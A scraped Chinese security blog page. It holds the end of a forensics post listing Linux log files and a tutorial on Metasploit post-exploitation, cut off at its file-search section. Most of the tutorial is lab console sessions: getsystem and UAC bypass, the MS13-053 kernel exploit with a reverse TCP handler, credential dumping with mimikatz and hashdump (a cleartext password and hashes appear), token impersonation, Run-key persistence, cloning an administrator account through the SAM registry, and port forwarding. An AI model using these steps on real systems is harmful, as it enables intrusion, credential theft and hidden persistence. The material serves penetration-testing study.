class="line">cron-20160807   2016-08-07 18:36:03 606821  0600</span><br><span class="line">spooler-20160807    2016-07-31 18:37:02 0   0600</span><br><span class="line">Xorg.0.log  2016-08-09 14:01:46 83699   0644</span><br><span class="line">btm2016-08-10 14:06:03  9600    0600</span><br><span class="line">anaconda.xlog   2016-07-11 23:59:08 35088   0600</span><br><span class="line">boot.log    2016-07-16 01:01:29 2959    0644</span><br><span class="line">secure-20160807 2016-08-05 20:01:06 27030   0600</span><br><span class="line">messages-20160717   2016-07-16 02:41:58 285781  0600</span><br><span class="line">spooler 2016-08-07 18:36:03 0   0600</span><br><span class="line">vmware-vmsvc.log    2016-07-25 11:29:49 4779    0644</span><br><span class="line">tallylog    2016-07-11 23:47:58 0   0600</span><br><span class="line">spice-vdagent.log   2016-07-12 00:00:17 0   0600</span><br><span class="line">vmware-vmusr.log    2016-08-03 11:04:06 10063   0644</span><br><span class="line">mysqld.log.rpmsave  2016-07-16 02:41:39 1672    0640</span><br><span class="line">maillog 2016-08-09 18:16:11 1795    0600</span><br><span class="line">dmesg.old   2016-07-11 23:59:43 89000   0644</span><br><span class="line">maillog-20160731    2016-07-30 18:32:35 4173    0600</span><br><span class="line">spooler-20160717    2016-07-11 23:51:44 0   0600</span><br><span class="line">cron-20160717   2016-07-17 18:16:01 35440   0600</span><br><span class="line">maillog-20160807    2016-08-06 18:16:04 4195    0600</span><br><span class="line">maillog-20160717    2016-07-16 18:22:11 1590    0600</span><br><span class="line">spooler-20160724    2016-07-17 18:16:01 0   0600</span><br><span class="line">spooler-20160731    2016-07-25 12:43:02 0   0600</span><br><span class="line">vmware-tools-upgrader.log   2016-07-12 00:03:18 363533  0644</span><br><span class="line">audit   1970-01-01 08:00:00     0</span><br><span class="line">anaconda.log    2016-07-11 23:59:08 20411   0600</span><br><span class="line">messages-20160731   2016-07-28 10:27:06 1884    0600</span><br><span class="line">secure-20160724 2016-07-23 00:21:37 1654    0600</span><br><span class="line">lastlog 2016-08-10 14:06:12 146292  0644</span><br><span class="line">btmp-20160801   2016-08-01 11:33:21 14976   0600</span><br><span class="line">anaconda.yum.log    2016-07-11 23:59:08 99366   0600</span><br><span class="line">dmesg   2016-07-16 01:00:10 90056   0644</span><br><span class="line">Xorg.2.log  2016-07-12 00:15:24 38224   0644</span><br><span class="line">mysqld.log  2016-07-16 02:43:47 1367    0640</span><br><span class="line">vmware-install.log  2016-07-12 00:03:18 5359    0644</span><br><span class="line">secure-20160717 2016-07-16 03:13:18 7399    0600</span><br><span class="line">secur20160731   2016-07-29 17:36:01 8445    0600</span><br><span class="line">messages-20160807   2016-08-07 06:04:01 34355   0600</span><br><span class="line">cron-20160731   2016-07-31 18:37:01 120163  0600</span><br><span class="line">messages    2016-08-10 02:42:01 468 0600</span><br><span class="line">dracut.log  2016-07-12 00:03:09 345367  0644</span><br></pre></td></tr></table></figure><p>接下来想删除掉<code>/var/log/yum.log</code>，看样子失败了<br>接下来查看<code>/var/empty/</code>,得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sshd/   2013-11-23 06:40:03 4096    0711</span><br><span class="line">../ 2016-07-22 19:50:16 4096    0755</span><br><span class="line">./  2016-07-11 23:54:25 4096    0755</span><br></pre></td></tr></table></figure><p>接下来，读取<code>/var/log/yum.log</code>的内容，，失败<br>好吧，，又想删除<code>/var/log/yum.log</code>,还是失败</p></div><footer class="article-footer"><a data-url="https://www.daikersec.com/post/3c7f43ba.html" data-id="cjh7qn8jg000yvdxvpe870dbp" class="article-share-link" data-share="baidu" data-title="铁人三项数据赛样题分析">分享到</a><ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wireshark/">wireshark</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/取证/">取证</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/数据分析/">数据分析</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日志分析/">日志分析</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/流量分析/">流量分析</a></li></ul></footer></div></article><article id="post-metasploit在后渗透中的作用" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/post/9668f403.html" class="article-date"><time datetime="2018-03-19T05:23:50.000Z" itemprop="datePublished">2018-03-19</time></a></div><div class="article-inner"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/post/9668f403.html">metasploit在后渗透中的作用</a></h1></header><div class="article-entry" itemprop="articleBody"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。</p><h2 id="0x01-权限提升"><a href="#0x01-权限提升" class="headerlink" title="0x01 权限提升"></a>0x01 权限提升</h2><ol><li><p>getsystem</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: TEST\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></li><li><p>bypassuac</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.161.138:4444</span><br></pre></td></tr></table></figure><ol><li>利用windows提权漏洞进行提升</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(windows/local/bypassuac_vbs) &gt; use post/windows/gather/enum_patches </span><br><span class="line">msf post(windows/gather/enum_patches) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf post(windows/gather/enum_patches) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[*] KB2778930 applied</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf post(windows/gather/enum_patches) &gt; search MS13-053</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                        Disclosure Date  Rank     Description</span><br><span class="line">   ----                                        ---------------  ----     -----------</span><br><span class="line">   exploit/windows/local/ms13_053_schlamperei  2013-12-01       average  Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)</span><br><span class="line">   exploit/windows/local/ppr_flatten_rec       2013-05-15       average  Windows EPATHOBJ::pprFlattenRec Local Privilege Escalation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf post(windows/gather/enum_patches) &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf exploit(windows/local/ms13_053_schlamperei) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms13_053_schlamperei):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 SP0/SP1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/ms13_053_schlamperei) &gt; </span><br><span class="line">msf exploit(windows/local/ms13_053_schlamperei) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(windows/local/ms13_053_schlamperei) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.161.138:4444 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 2980 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 2980...</span><br><span class="line">[*] Injecting exploit into 2980...</span><br><span class="line">[*] Found winlogon.exe with PID 432</span><br><span class="line">[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.161.132</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.161.138:4444 -&gt; 192.168.161.132:49959) at 2018-03-19 16:56:51 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h2 id="0x02-域管理员嗅探"><a href="#0x02-域管理员嗅探" class="headerlink" title="0x02 域管理员嗅探"></a>0x02 域管理员嗅探</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; use post/windows/gather/enum_domain</span><br><span class="line">msf post(windows/gather/enum_domain) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/enum_domain):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">msf post(windows/gather/enum_domain) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf post(windows/gather/enum_domain) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: test</span><br><span class="line">[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf post(windows/gather/enum_domain) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: test</span><br><span class="line">[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure><h2 id="0x03抓取密码"><a href="#0x03抓取密码" class="headerlink" title="0x03抓取密码"></a>0x03抓取密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz </span><br><span class="line">Loading extension mimikatz...Success.</span><br><span class="line">meterpreter &gt; help</span><br><span class="line">...</span><br><span class="line">Mimikatz Commands</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    kerberos          Attempt to retrieve kerberos creds</span><br><span class="line">    livessp           Attempt to retrieve livessp creds</span><br><span class="line">    mimikatz_command  Run a custom command</span><br><span class="line">    msv               Attempt to retrieve msv creds (hashes)</span><br><span class="line">    ssp               Attempt to retrieve ssp creds</span><br><span class="line">    tspkg             Attempt to retrieve tspkg creds</span><br><span class="line">    wdigest           Attempt to retrieve wdigest creds</span><br><span class="line"></span><br><span class="line">meterpreter &gt; wdigest </span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs</span><br><span class="line">[+] Got SeDebugPrivilege</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;49485   NTLM                                    </span><br><span class="line">0;293672  Kerberos   TEST          Administrator  TopSec_2017</span><br><span class="line">0;996     Negotiate  TEST          TOPSEC$        ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c </span><br><span class="line">0;999     Negotiate  TEST          TOPSEC$        ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c</span><br></pre></td></tr></table></figure><p>或者<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf post(windows/gather/hashdump) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 2739ba60d0407daf0d866cb3ee4b6b9f...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f013ff76154a124f8cfc32f654582420:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure><p></p><h2 id="0x04假冒令牌"><a href="#0x04假冒令牌" class="headerlink" title="0x04假冒令牌"></a>0x04假冒令牌</h2><p><code>空格和斜杠注意转译</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;  use incognito</span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; help</span><br><span class="line">...</span><br><span class="line">Incognito Commands</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Command              Description</span><br><span class="line">    -------              -----------</span><br><span class="line">    add_group_user       Attempt to add a user to a global group with all tokens</span><br><span class="line">    add_localgroup_user  Attempt to add a user to a local group with all tokens</span><br><span class="line">    add_user             Attempt to add a user with all tokens</span><br><span class="line">    impersonate_token    Impersonate specified token</span><br><span class="line">    list_tokens          List tokens available under current user context</span><br><span class="line">    snarf_hashes         Snarf challenge/response hashes for every token</span><br><span class="line"></span><br><span class="line">meterpreter &gt; list_tokens </span><br><span class="line">Usage: list_tokens &lt;list_order_option&gt;</span><br><span class="line"></span><br><span class="line">Lists all accessible tokens and their privilege level</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -g        List tokens by unique groupname</span><br><span class="line">    -u        List tokens by unique username</span><br><span class="line"></span><br><span class="line">meterpreter &gt; list_tokens  -u</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token NT AUTHORITY\\SYSTEM</span><br><span class="line">[-] User token NT not found</span><br><span class="line">meterpreter &gt; impersonate_token NT\ AUTHORITY\\SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h2 id="0X05注册表操作"><a href="#0X05注册表操作" class="headerlink" title="0X05注册表操作"></a>0X05注册表操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg -h</span><br><span class="line">Usage: reg [command] [options]</span><br><span class="line"></span><br><span class="line">Interact with the target machine&apos;s registry.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d &lt;opt&gt;  The data to store in the registry value.</span><br><span class="line">    -h        Help menu.</span><br><span class="line">    -k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).</span><br><span class="line">    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials</span><br><span class="line">    -t &lt;opt&gt;  The registry value type (E.g. REG_SZ).</span><br><span class="line">    -v &lt;opt&gt;  The registry value name (E.g. Stuff).</span><br><span class="line">    -w        Set KEY_WOW64 flag, valid values [32|64].</span><br><span class="line">COMMANDS:</span><br><span class="line"></span><br><span class="line">    enumkey	Enumerate the supplied registry key [-k &lt;key&gt;]</span><br><span class="line">    createkey	Create the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    deletekey	Delete the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    queryclass Queries the class of the supplied key [-k &lt;key&gt;]</span><br><span class="line">    setval	Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]</span><br><span class="line">    deleteval	Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]</span><br><span class="line">    queryval	Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]</span><br></pre></td></tr></table></figure><p>下面演示通过注册表设置开机自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line"></span><br><span class="line">  Values (1):</span><br><span class="line"></span><br><span class="line">	VMware User Process</span><br><span class="line"></span><br><span class="line">meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note -d &apos;C:\Windows\System32\notepad.exe&apos;</span><br><span class="line">Successfully set note of REG_SZ.</span><br><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line"></span><br><span class="line">  Values (2):</span><br><span class="line"></span><br><span class="line">	VMware User Process</span><br><span class="line">	note</span><br><span class="line"></span><br><span class="line">meterpreter &gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note </span><br><span class="line">Key: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line">Name: note</span><br><span class="line">Type: REG_SZ</span><br><span class="line">Data: C:\Windows\System32\notepad.exe</span><br></pre></td></tr></table></figure><p>下面演示怎么通过注册表复制克隆用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg enumkey -k HKLM\\sam\\sam\\domains\\account\\users</span><br><span class="line">Enumerating: HKLM\sam\sam\domains\account\users</span><br><span class="line"></span><br><span class="line">  Keys (3):</span><br><span class="line"></span><br><span class="line">	000001F4</span><br><span class="line">	000001F5</span><br><span class="line">	Names</span><br><span class="line"></span><br><span class="line">  Values (1):</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1884 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\windows\system32&gt;net user guest /active:yes                </span><br><span class="line">net user guest /active:yes</span><br><span class="line"></span><br><span class="line">C:\windows\system32&gt;reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5</span><br><span class="line">reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5</span><br><span class="line"> sam\sam\domains\account\users\000001f4\F �Ѵ��ڣ�Ҫ������(Yes/No/All)? Yes</span><br><span class="line">\ֵ sam\sam\domains\account\users\000001f4\V �Ѵ��ڣ�Ҫ������(Yes/No/All)?No  </span><br><span class="line">�����ɹ����ɡ�</span><br></pre></td></tr></table></figure><h2 id="0x06端口转发"><a href="#0x06端口转发" class="headerlink" title="0x06端口转发"></a>0x06端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd delete -l 3389</span><br><span class="line">[*] Successfully stopped TCP relay on 0.0.0.0:3389</span><br><span class="line">meterpreter &gt; portfwd add -l 3389 -p 3389 -r 192.168.161.138</span><br><span class="line">[*] Local TCP relay created: :3389 &lt;-&gt; 192.168.161.138:3389</span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote                Direction</span><br><span class="line">   -----  -----         ------                ---------</span><br><span class="line">   1      0.0.0.0:3389  192.168.161.138:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br></pre></td></tr></table></figure><h2 id="0x07搜索文件"><a href="#0x07搜索文件" class="headerlink" 